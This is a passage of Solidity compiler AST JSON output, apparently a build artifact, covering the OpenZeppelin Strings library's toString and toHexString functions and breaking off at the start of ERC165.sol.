],"functionName":{"name":"mod","nodeType":"YulIdentifier","src":"942:3:7"},"nodeType":"YulFunctionCall","src":"942:14:7"},{"name":"_SYMBOLS","nodeType":"YulIdentifier","src":"958:8:7"}],"functionName":{"name":"byte","nodeType":"YulIdentifier","src":"937:4:7"},"nodeType":"YulFunctionCall","src":"937:30:7"}],"functionName":{"name":"mstore8","nodeType":"YulIdentifier","src":"924:7:7"},"nodeType":"YulFunctionCall","src":"924:44:7"},"nodeType":"YulExpressionStatement","src":"924:44:7"}]},"documentation":"@solidity memory-safe-assembly","evmVersion":"london","externalReferences":[{"declaration":1518,"isOffset":false,"isSlot":false,"src":"958:8:7","valueSize":1},{"declaration":1546,"isOffset":false,"isSlot":false,"src":"932:3:7","valueSize":1},{"declaration":1524,"isOffset":false,"isSlot":false,"src":"946:5:7","valueSize":1}],"id":1553,"nodeType":"InlineAssembly","src":"893:93:7"},{"expression":{"id":1556,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1554,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1524,"src":"1003:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"hexValue":"3130","id":1555,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1012:2:7","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"src":"1003:11:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1557,"nodeType":"ExpressionStatement","src":"1003:11:7"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1560,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1558,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1524,"src":"1036:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":1559,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1045:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1036:10:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1562,"nodeType":"IfStatement","src":"1032:21:7","trueBody":{"id":1561,"nodeType":"Break","src":"1048:5:7"}}]},"condition":{"hexValue":"74727565","id":1549,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"795:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"id":1564,"nodeType":"WhileStatement","src":"788:280:7"},{"expression":{"id":1565,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1539,"src":"1088:6:7","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":1528,"id":1566,"nodeType":"Return","src":"1081:13:7"}]}]},"documentation":{"id":1522,"nodeType":"StructuredDocumentation","src":"320:90:7","text":" @dev Converts a `uint256` to its ASCII `string` decimal representation."},"id":1569,"implemented":true,"kind":"function","modifiers":[],"name":"toString","nameLocation":"424:8:7","nodeType":"FunctionDefinition","parameters":{"id":1525,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1524,"mutability":"mutable","name":"value","nameLocation":"441:5:7","nodeType":"VariableDeclaration","scope":1569,"src":"433:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1523,"name":"uint256","nodeType":"ElementaryTypeName","src":"433:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"432:15:7"},"returnParameters":{"id":1528,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1527,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1569,"src":"471:13:7","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1526,"name":"string","nodeType":"ElementaryTypeName","src":"471:6:7","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"470:15:7"},"scope":1686,"src":"415:696:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1588,"nodeType":"Block","src":"1290:100:7","statements":[{"id":1587,"nodeType":"UncheckedBlock","src":"1300:84:7","statements":[{"expression":{"arguments":[{"id":1578,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1572,"src":"1343:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1584,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1581,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1572,"src":"1362:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":1579,"name":"Math","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2587,"src":"1350:4:7","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Math_$2587_$","typeString":"type(library Math)"}},"id":1580,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"log256","nodeType":"MemberAccess","referencedDeclaration":2547,"src":"1350:11:7","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":1582,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1350:18:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1583,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1371:1:7","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1350:22:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1577,"name":"toHexString","nodeType":"Identifier","overloadedDeclarations":[1589,1665,1685],"referencedDeclaration":1665,"src":"1331:11:7","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256,uint256) pure returns (string memory)"}},"id":1585,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1331:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":1576,"id":1586,"nodeType":"Return","src":"1324:49:7"}]}]},"documentation":{"id":1570,"nodeType":"StructuredDocumentation","src":"1117:94:7","text":" @dev Converts a `uint256` to its ASCII `string` hexadecimal representation."},"id":1589,"implemented":true,"kind":"function","modifiers":[],"name":"toHexString","nameLocation":"1225:11:7","nodeType":"FunctionDefinition","parameters":{"id":1573,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1572,"mutability":"mutable","name":"value","nameLocation":"1245:5:7","nodeType":"VariableDeclaration","scope":1589,"src":"1237:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1571,"name":"uint256","nodeType":"ElementaryTypeName","src":"1237:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1236:15:7"},"returnParameters":{"id":1576,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1575,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1589,"src":"1275:13:7","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1574,"name":"string","nodeType":"ElementaryTypeName","src":"1275:6:7","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"1274:15:7"},"scope":1686,"src":"1216:174:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1664,"nodeType":"Block","src":"1603:347:7","statements":[{"assignments":[1600],"declarations":[{"constant":false,"id":1600,"mutability":"mutable","name":"buffer","nameLocation":"1626:6:7","nodeType":"VariableDeclaration","scope":1664,"src":"1613:19:7","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1599,"name":"bytes","nodeType":"ElementaryTypeName","src":"1613:5:7","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1609,"initialValue":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1607,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1605,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1603,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1645:1:7","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1604,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1594,"src":"1649:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1645:10:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"32","id":1606,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1658:1:7","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"1645:14:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1602,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"NewExpression","src":"1635:9:7","typeDescriptions":{"typeIdentifier":"t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$","typeString":"function (uint256) pure returns (bytes memory)"},"typeName":{"id":1601,"name":"bytes","nodeType":"ElementaryTypeName","src":"1639:5:7","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}}},"id":1608,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1635:25:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"1613:47:7"},{"expression":{"id":1614,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1610,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"1670:6:7","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1612,"indexExpression":{"hexValue":"30","id":1611,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1677:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"1670:9:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1613,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"1682:3:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d","typeString":"literal_string \"0\""},"value":"0"},"src":"1670:15:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1615,"nodeType":"ExpressionStatement","src":"1670:15:7"},{"expression":{"id":1620,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1616,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"1695:6:7","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1618,"indexExpression":{"hexValue":"31","id":1617,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1702:1:7","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"1695:9:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"78","id":1619,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"1707:3:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83","typeString":"literal_string \"x\""},"value":"x"},"src":"1695:15:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1621,"nodeType":"ExpressionStatement","src":"1695:15:7"},{"body":{"id":1650,"nodeType":"Block","src":"1765:83:7","statements":[{"expression":{"id":1644,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":1636,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"1779:6:7","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1638,"indexExpression":{"id":1637,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1623,"src":"1786:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"1779:9:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"baseExpression":{"id":1639,"name":"_SYMBOLS","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1518,"src":"1791:8:7","typeDescriptions":{"typeIdentifier":"t_bytes16","typeString":"bytes16"}},"id":1643,"indexExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1642,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1640,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1592,"src":"1800:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"hexValue":"307866","id":1641,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1808:3:7","typeDescriptions":{"typeIdentifier":"t_rational_15_by_1","typeString":"int_const 15"},"value":"0xf"},"src":"1800:11:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"1791:21:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"src":"1779:33:7","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"id":1645,"nodeType":"ExpressionStatement","src":"1779:33:7"},{"expression":{"id":1648,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1646,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1592,"src":"1826:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":">>=","rightHandSide":{"hexValue":"34","id":1647,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1836:1:7","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"1826:11:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1649,"nodeType":"ExpressionStatement","src":"1826:11:7"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1632,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1630,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1623,"src":"1753:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"31","id":1631,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1757:1:7","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1753:5:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1651,"initializationExpression":{"assignments":[1623],"declarations":[{"constant":false,"id":1623,"mutability":"mutable","name":"i","nameLocation":"1733:1:7","nodeType":"VariableDeclaration","scope":1651,"src":"1725:9:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1622,"name":"uint256","nodeType":"ElementaryTypeName","src":"1725:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1629,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1628,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1626,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":1624,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1737:1:7","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":1625,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1594,"src":"1741:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1737:10:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1627,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1750:1:7","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1737:14:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"1725:26:7"},"loopExpression":{"expression":{"id":1634,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"--","prefix":true,"src":"1760:3:7","subExpression":{"id":1633,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1623,"src":"1762:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1635,"nodeType":"ExpressionStatement","src":"1760:3:7"},"nodeType":"ForStatement","src":"1720:128:7"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1655,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1653,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1592,"src":"1865:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":1654,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1874:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1865:10:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"537472696e67733a20686578206c656e67746820696e73756666696369656e74","id":1656,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"1877:34:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_04fc88320d7c9f639317c75102c103ff0044d3075a5c627e24e76e5bbb2733c2","typeString":"literal_string \"Strings: hex length insufficient\""},"value":"Strings: hex length insufficient"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_04fc88320d7c9f639317c75102c103ff0044d3075a5c627e24e76e5bbb2733c2","typeString":"literal_string \"Strings: hex length insufficient\""}],"id":1652,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"1857:7:7","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1657,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1857:55:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1658,"nodeType":"ExpressionStatement","src":"1857:55:7"},{"expression":{"arguments":[{"id":1661,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"1936:6:7","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":1660,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1929:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_string_storage_ptr_$","typeString":"type(string storage pointer)"},"typeName":{"id":1659,"name":"string","nodeType":"ElementaryTypeName","src":"1929:6:7","typeDescriptions":{}}},"id":1662,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1929:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":1598,"id":1663,"nodeType":"Return","src":"1922:21:7"}]},"documentation":{"id":1590,"nodeType":"StructuredDocumentation","src":"1396:112:7","text":" @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length."},"id":1665,"implemented":true,"kind":"function","modifiers":[],"name":"toHexString","nameLocation":"1522:11:7","nodeType":"FunctionDefinition","parameters":{"id":1595,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1592,"mutability":"mutable","name":"value","nameLocation":"1542:5:7","nodeType":"VariableDeclaration","scope":1665,"src":"1534:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1591,"name":"uint256","nodeType":"ElementaryTypeName","src":"1534:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1594,"mutability":"mutable","name":"length","nameLocation":"1557:6:7","nodeType":"VariableDeclaration","scope":1665,"src":"1549:14:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1593,"name":"uint256","nodeType":"ElementaryTypeName","src":"1549:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1533:31:7"},"returnParameters":{"id":1598,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1597,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1665,"src":"1588:13:7","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1596,"name":"string","nodeType":"ElementaryTypeName","src":"1588:6:7","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"1587:15:7"},"scope":1686,"src":"1513:437:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1684,"nodeType":"Block","src":"2175:76:7","statements":[{"expression":{"arguments":[{"arguments":[{"arguments":[{"id":1678,"name":"addr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1668,"src":"2220:4:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":1677,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2212:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint160_$","typeString":"type(uint160)"},"typeName":{"id":1676,"name":"uint160","nodeType":"ElementaryTypeName","src":"2212:7:7","typeDescriptions":{}}},"id":1679,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2212:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint160","typeString":"uint160"}],"id":1675,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2204:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1674,"name":"uint256","nodeType":"ElementaryTypeName","src":"2204:7:7","typeDescriptions":{}}},"id":1680,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2204:22:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1681,"name":"_ADDRESS_LENGTH","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1521,"src":"2228:15:7","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint8","typeString":"uint8"}],"id":1673,"name":"toHexString","nodeType":"Identifier","overloadedDeclarations":[1589,1665,1685],"referencedDeclaration":1665,"src":"2192:11:7","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256,uint256) pure returns (string memory)"}},"id":1682,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"2192:52:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":1672,"id":1683,"nodeType":"Return","src":"2185:59:7"}]},"documentation":{"id":1666,"nodeType":"StructuredDocumentation","src":"1956:141:7","text":" @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation."},"id":1685,"implemented":true,"kind":"function","modifiers":[],"name":"toHexString","nameLocation":"2111:11:7","nodeType":"FunctionDefinition","parameters":{"id":1669,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1668,"mutability":"mutable","name":"addr","nameLocation":"2131:4:7","nodeType":"VariableDeclaration","scope":1685,"src":"2123:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1667,"name":"address","nodeType":"ElementaryTypeName","src":"2123:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2122:14:7"},"returnParameters":{"id":1672,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1671,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1685,"src":"2160:13:7","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1670,"name":"string","nodeType":"ElementaryTypeName","src":"2160:6:7","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2159:15:7"},"scope":1686,"src":"2102:149:7","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":1687,"src":"188:2065:7","usedErrors":[]}],"src":"101:2153:7"},"id":7},"@openzeppelin/contracts/utils/introspection/ERC165.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/introspection/ERC165.sol","exportedSymbols":{"ERC165":[1710],"IERC165":[1722]},"id":1711,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1688,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"99:23:8"},{"absolutePath":"@open